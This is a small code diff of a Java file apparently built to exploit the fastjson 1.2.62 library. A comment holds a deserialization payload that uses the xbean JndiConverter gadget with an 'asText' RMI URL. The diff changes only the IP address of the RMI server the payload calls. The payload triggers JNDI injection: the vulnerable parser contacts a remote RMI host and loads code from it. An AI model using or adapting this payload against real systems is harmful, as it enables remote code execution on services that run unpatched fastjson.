@@ -5,7 +5,7 @@ import com.alibaba.fastjson.parser.ParserConfig;
 /*
 {
     "@type":"org.apache.xbean.propertyeditor.JndiConverter",
-        "asText":"rmi://10.41.230.66:1099/maedu0"
+        "asText":"rmi://10.58.120.200:1099/maedu0"
 }
  */
 public class fastjson_1_2_62 {
